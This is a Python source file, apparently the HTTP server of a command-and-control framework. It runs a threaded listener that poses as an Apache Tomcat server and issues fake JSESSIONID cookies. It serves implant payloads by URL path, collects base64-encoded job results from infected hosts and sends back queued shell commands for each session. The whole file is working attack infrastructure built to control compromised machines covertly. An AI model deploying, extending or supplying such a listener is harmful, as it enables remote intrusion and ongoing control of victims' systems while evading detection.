#!/usr/bin/env python3
#coding:utf-8


import sys
import time
import uuid
import threading
from socketserver import ThreadingMixIn
from http.server import HTTPServer, BaseHTTPRequestHandler
from base64 import b64decode, b64encode

from lib.cipher import ARC4
from lib.shell import Shell
from lib.payload import Payload
from lib.shell import Shell


class HTTPHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args, **kwargs):
        pass

    def __check_response(self, reponse_text):
        try:
            r1 = b64decode(reponse_text).decode('utf-8')
            #r1 = self.__decrypt_context(r0)
            res = r1.split('|')
            if len(res) >= 2:
                return int(res[0]), ''.join([res[x] for x in range(1, len(res))])
            else:
                 return None, reponse_text
        except:
            return None, None

    def _reply2client(self, status_code, content, cookie):
        self.send_response(status_code)
        self.send_header('Content-Type', 'text/html')
        if not self.headers.get('cookie') and cookie:
            self.send_header('Set-Cookie', cookie)
        self.send_header('Content-Length', len(content))
        self.end_headers() #endswith \r\n
        if type(content) is str:
            self.wfile.write(content.encode())
        else:
            self.wfile.write(content)   #发送response
            
    def handle(self):
        self.server_version = 'Apache Tomcat 7.0.20'
        self.sys_version = ''
        self.headers_to_send = []
        return super().handle()

    @property
    def __set_cookie(self):
        session_value = uuid.uuid1()
        GMT_FORMAT = '%a, %d %b %Y %H:%M:%S GMT+0800 (CST)'
        expires = (time.time() + 3600)     #Cookie存活时间
        expires = time.strftime(GMT_FORMAT, time.localtime(expires))
        cookie = "JSESSIONID={}; expries={}; path={}".format(session_value, expires, self.path)
        return cookie

    def do_GET(self):
        '''
        处理client提交的GET请求，根据请求的path来做不同时的响应
        '''
        try:
            payload_handler = getattr(Payload, 'payload_{}'.format(self.path.strip('/')))
            payload = payload_handler(self.server.server_address)
            status_code = 200
        except AttributeError:
            payload = ''
            status_code = 404
        self._reply2client(status_code, payload, '')

    def do_POST(self):
        '''
        处理client提交的POST请求
        '''
        #content = ''
        setCookie = ''
        shell = self.server.shell

        #当有POST的REQUESTS发来时，先进行读取，之后再进行判断和发送任务
        content_len = int(self.headers['content-length'])
        response_body = self.rfile.read(content_len)
        jobid, job_res = self.__check_response(response_body) 

        try:
            #获取sessionID,如果没有则split分抛出异常
            sessionID = self.headers.get('cookie').split('=')[1]
        except AttributeError:
            setCookie = self.__set_cookie
            sessionID = setCookie.split(';')[0].split('=')[1]
            #content = shell.session_init(sessionID = sessionID, job_response = job_res)
        finally:
            if sessionID in shell.SESSIONS:
                job_key, content = shell.job_load(sessionID)
                if content is None:
                    content = '' 
                if jobid and jobid ==1 :
                    shell.job_done(sessionID, job_key, job_res)
            else:
                #sessionID = self.headers.get('cookie').split('=')[1]
                content = shell.session_init(sessionID = sessionID, job_response = job_res)

        self._reply2client(200, content, setCookie)

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    pass

class Server(threading.Thread):
    def __init__(self,host, port, shell):
        super().__init__()
        self.handle_class = HTTPHandler
        self.daemon = True 
        self.host = host
        self.port = port
        self.httpd = None
        self.shell = shell 
        self.__setup_server()

    def __setup_server(self):
        self.httpd = ThreadedHTTPServer((self.host, self.port ), self.handle_class)
        self.httpd.daemon_threads = True
        self.httpd.shell = self.shell
        
    def run(self):
        try:
            self.httpd.serve_forever()
        except:
            pass

    def shutdown(self):
        #self.httpd.shutdwon()
        self.httpd.socket.close()
        self.httpd.server_close()

        for thread in threading.enumerate():
            if thread.isAlive():
                try:
                    thread._Thread__stop()
                except:
                    pass